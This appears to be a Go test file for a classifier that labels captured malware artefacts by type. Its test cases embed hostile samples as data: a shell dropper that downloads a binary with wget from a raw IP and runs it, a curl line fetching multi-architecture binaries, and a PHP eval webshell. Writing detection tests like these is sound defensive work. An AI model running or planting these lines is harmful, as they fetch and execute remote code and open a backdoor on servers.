package artefacto

import "testing"

func TestClasificar(t *testing.T) {
	casos := []struct {
		nombre string
		datos  string
		tipo   string
		tam    int64
		quiero string
	}{
		{"dropper", "#!/bin/sh\nwget http://1.2.3.4/x.arm7\nchmod +x x.arm7\n./x.arm7\n", "Script (#!/bin/sh)", 60, "dropper"},
		{"dropper multiarch", "#!/bin/sh\ncurl http://a/bins/arm7; curl http://a/bins/mips; curl http://a/bins/x86\n", "Script (#!/bin/sh)", 90, "dropper"},
		{"botnet mips", "basura binaria", "Ejecutable de Linux (ELF) MIPS", 60000, "botnet"},
		{"botnet firma", "algo mirai gafgyt dentro", "Ejecutable de Linux (ELF) x86-64", 40000, "botnet"},
		{"minero", "pool stratum+tcp://x xmrig --donate-level 1", "Ejecutable de Linux (ELF) x86-64", 100000, "minero"},
		{"webshell", "<?php eval($_POST['x']); ?>", "Texto", 40, "webshell"},
		{"muestra elf normal", "binario x86 cualquiera", "Ejecutable de Linux (ELF) x86-64", 20000, "muestra"},
		{"prueba 1 byte", "1", "Texto", 1, "prueba"},
		{"texto normal", "esto es una nota de texto sin nada raro", "Texto", 100, ""},
	}
	for _, c := range casos {
		if got := Clasificar([]byte(c.datos), c.tipo, c.tam); got != c.quiero {
			t.Errorf("%s: Clasificar = %q, quiero %q", c.nombre, got, c.quiero)
		}
	}
}

func TestArquitecturasEnTextoNoCuentaSubcadenas(t *testing.T) {
	// "arm" dentro de "alarma" no debe contar como arquitectura.
	if n := arquitecturasEnTexto("una alarma cualquiera"); n != 0 {
		t.Fatalf("conto una subcadena como arquitectura: %d", n)
	}
	if n := arquitecturasEnTexto("bins arm7 y mips"); n != 2 {
		t.Fatalf("no conto arm7 y mips: %d", n)
	}
}
